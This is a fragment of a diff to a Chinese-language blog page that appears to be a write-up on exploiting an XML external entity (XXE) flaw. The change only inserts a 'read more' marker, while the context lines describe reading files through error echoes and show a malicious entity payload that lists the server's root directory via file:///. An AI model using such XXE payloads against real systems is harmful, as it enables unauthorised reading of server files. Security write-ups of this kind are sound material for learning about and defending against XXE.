@@ -310,6 +310,8 @@
 
 
 <p>3、成功通过报错回显读取的文件：</p>
+<span id="more"></span>
+
 <p><img src="1642311110833-a2a22bfa-9b31-4002-8806-333f4c0a3f30.png" alt="img"></p>
 <p>也可进行列目录，更改托管的恶意xml文件中实体file的内容即可，例如列根目录：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">ent</span> <span class="string">&quot;&lt;!ENTITY data SYSTEM &#x27;%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
